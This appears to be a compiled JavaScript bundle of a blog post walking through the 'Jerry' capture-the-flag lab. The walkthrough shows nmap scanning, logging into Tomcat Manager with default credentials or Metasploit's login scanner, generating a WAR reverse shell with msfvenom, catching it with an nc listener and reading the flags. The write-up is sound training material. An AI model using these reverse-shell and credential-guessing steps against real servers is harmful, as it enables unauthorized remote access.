"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[8929],{484:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-6-b730756cc58d8a5efdd00ae6ffd2a0f1.png"},489:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-3-dd6c3ee530600db4dff963a82b2500d0.png"},699:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-1-9bc478d2c4c78cf3404b0c25a80bdfce.png"},707:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-9-76a69ce4d2d0651e8e5e429b3b3f6f5d.png"},733:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-7-bb38c07471055921e123bb8eb4812166.png"},3921:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-13e88223d5fcbe743d32858ceda2d22e.png"},5235:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-10-1a456c60f264d148761cf339e345eaac.png"},6602:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-j-8-09af0a711e62d49783cddede3487b0d1.png"},8453:(e,t,n)=>{n.d(t,{R:()=>r,x:()=>o});var s=n(6540);const a={},i=s.createContext(a);function r(e){const t=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),s.createElement(i.Provider,{value:t},e.children)}},9376:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>d,contentTitle:()=>o,default:()=>c,frontMatter:()=>r,metadata:()=>s,toc:()=>l});var s=n(9844),a=n(4848),i=n(8453);const r={title:"Jerry",date:new Date("2025-04-06T00:00:00.000Z"),tags:["easy","windows"]},o=void 0,d={authorsImageUrls:[]},l=[{value:"Task1",id:"task1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3}];function h(e){const t={code:"code",h3:"h3",img:"img",p:"p",strong:"strong",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h3,{id:"task1",children:"Task1"}),"\n",(0,a.jsx)(t.p,{children:"Which TCP port is open on the remote host?"}),"\n",(0,a.jsx)(t.p,{children:"Run nmap to scan for ports"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.code,{children:"nmap -sS -p- <target_ip>"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(3921).A+"",width:"680",height:"222"})}),"\n",(0,a.jsx)(t.p,{children:"After scanning, the port 8080 is revelead to be open, where the http-proxy service is running."}),"\n",(0,a.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,a.jsx)(t.p,{children:"Which web server is running on the remote host? Looking for two words."}),"\n",(0,a.jsx)(t.p,{children:"To find the web server, we need to add the version field on the nmap scan."}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.code,{children:"nmap -sV -p 8080 <target_ip>"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(699).A+"",width:"801",height:"274"})}),"\n",(0,a.jsxs)(t.p,{children:["We see on the version that the web server is ",(0,a.jsx)(t.strong,{children:"Apache Tomcat"}),"."]}),"\n",(0,a.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,a.jsx)(t.p,{children:"Which relative path on the webserver leads to the Web Application Manager?"}),"\n",(0,a.jsx)(t.p,{children:"Open a browser and navigate to the ip address of the target. Remember to specify the port to be 8080."}),"\n",(0,a.jsxs)(t.p,{children:["Take a look at the page, to see you can find anything useful. Under ",(0,a.jsx)(t.strong,{children:"Managing Tomcat"})," you see a URL to ",(0,a.jsx)(t.strong,{children:"manager webapp"})," which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in ",(0,a.jsx)(t.strong,{children:"$CATALINA_HOME/conf/tomcat-users.xml"}),". This seems like an interesting information, but let's first see what the URL gets us. When clicking we get redirected to ",(0,a.jsx)(t.strong,{children:"/manager/html"})," where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for."]}),"\n",(0,a.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,a.jsxs)(t.p,{children:["What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username",":password"]}),"\n",(0,a.jsxs)(t.p,{children:["On the previous step, we navigated to the ",(0,a.jsx)(t.strong,{children:"/manager/html"})," were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!"]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(484).A+"",width:"993",height:"395"})}),"\n",(0,a.jsxs)(t.p,{children:["Another approach to this, is using ",(0,a.jsx)(t.strong,{children:"Metasploit Framework"}),". First, run ",(0,a.jsx)(t.code,{children:"msfconsole"})," and then ",(0,a.jsx)(t.code,{children:"search tomcat"}),". There you will find the auxiliary ",(0,a.jsx)(t.strong,{children:"auxiliary/scanner/http/tomcat_mgr_login"})," which will attempt to login based on a list of username - password names. To use it, run ",(0,a.jsx)(t.code,{children:"use <number_of_option>"})," and then to see what you it is required for you to set ",(0,a.jsx)(t.code,{children:"show options"}),"."]}),"\n",(0,a.jsxs)(t.p,{children:["To select the target IP address and the port, run ",(0,a.jsx)(t.code,{children:"set RHOSTS <target_ip>"})," and ",(0,a.jsx)(t.code,{children:"set RPORT <target_port>"}),". Then type ",(0,a.jsx)(t.code,{children:"run"})," and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before."]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(733).A+"",width:"752",height:"246"})}),"\n",(0,a.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,a.jsx)(t.p,{children:"Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?"}),"\n",(0,a.jsx)(t.p,{children:"After authenticating in the previous page, you will see this part in the Web Application Manager page:"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(489).A+"",width:"920",height:"283"})}),"\n",(0,a.jsxs)(t.p,{children:["We can see that the file type is ",(0,a.jsx)(t.strong,{children:"WAR"}),"."]}),"\n",(0,a.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,a.jsx)(t.p,{children:"Submit the flag located on the user's desktop."}),"\n",(0,a.jsx)(t.p,{children:"From the previous task, we realised we would be able to upload a war file, which smells like a backdoor we could use for remote code execution. A war file is used to deploy java based applications and we can use it to deploy a reverse shell and gain remote access to the target system."}),"\n",(0,a.jsx)(t.p,{children:"We can generate a war file using msfvenom"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.code,{children:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f war > shell.war"})}),"\n",(0,a.jsx)(t.p,{children:"An open the port that was specified so we can listen to the connection from the target"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.code,{children:"sudo nc -lvnp <your_port>"})}),"\n",(0,a.jsx)(t.p,{children:"Then we navigate to the manager page and upload the war payload.\nOn the list of applications we can see our deployment"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(6602).A+"",width:"954",height:"77"})}),"\n",(0,a.jsxs)(t.p,{children:["Then we can navigate to the ",(0,a.jsx)(t.strong,{children:"/shell"})," path and on our temrminal that we opened the port we can see are connected!"]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(707).A+"",width:"276",height:"88"})}),"\n",(0,a.jsxs)(t.p,{children:["Navigating to the directory ",(0,a.jsx)(t.strong,{children:"\\Users\\Administrator\\Desktop"})," and lisitng the direcrtories, we find a folder named flags."]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{alt:"alt text",src:n(5235).A+"",width:"590",height:"231"})}),"\n",(0,a.jsxs)(t.p,{children:["Running ",(0,a.jsx)(t.code,{children:'type "2 for the price of 1.txt"'})," we get both the user and the root flags."]})]})}function c(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},9844:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/Jerry","editUrl":"https://github.com/danae-pan/Blog/blog/Jerry.md","source":"@site/blog/Jerry.md","title":"Jerry","description":"Task1","date":"2025-04-06T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":3.26,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Jerry","date":"2025-04-06T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Sau","permalink":"/Blog/blog/Sau"},"nextItem":{"title":"Cap","permalink":"/Blog/blog/Cap"}}')}}]);